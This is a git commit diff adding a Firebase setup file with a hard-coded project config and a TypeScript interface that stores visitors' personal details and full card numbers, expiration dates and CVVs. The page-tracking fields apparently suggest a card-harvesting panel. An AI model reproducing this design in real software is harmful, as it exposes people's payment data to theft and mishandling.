a95747ca359f55aea29b5de582eacb5d8ee42ede
a96363877 <a96363877@gmail.com>
2025-05-26 16:24:00 +0300

    Initial commit

---
+++ lib/firestore.ts
@@ -0,0 +1,45 @@
+import { initializeApp, getApps, getApp } from 'firebase/app';
+import { getAuth } from 'firebase/auth';
+import { getFirestore} from 'firebase/firestore';
+import { getDatabase} from 'firebase/database';
+
+const firebaseConfig = {
+  apiKey: "AIzaSyDCu8i9M9xoXN1h2Td7obeUfMaJJwav5Vk",
+  authDomain: "zainqpp-e796a.firebaseapp.com",
+  projectId: "zainqpp-e796a",
+  storageBucket: "zainqpp-e796a.firebasestorage.app",
+  messagingSenderId: "180234424004",
+  appId: "1:180234424004:web:01c54f114f52da940bc391",
+  measurementId: "G-W2844M2JHS"
+};
+
+
+const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
+const auth = getAuth(app);
+const db = getFirestore(app);
+const database = getDatabase(app);
+
+
+export { app, auth, db ,database};
+
+export interface NotificationDocument {
+  id: string;
+  name: string;
+  hasPersonalInfo: boolean;
+  hasCardInfo: boolean;
+  currentPage: string;
+  time: string;
+  notificationCount: number;
+  personalInfo?: {
+    fullName: string;
+    email: string;
+    phone: string;
+    address: string;
+  };
+  cardInfo?: {
+    cardNumber: string;
+    expirationDate: string;
+    cvv: string;
+  };
+}
+
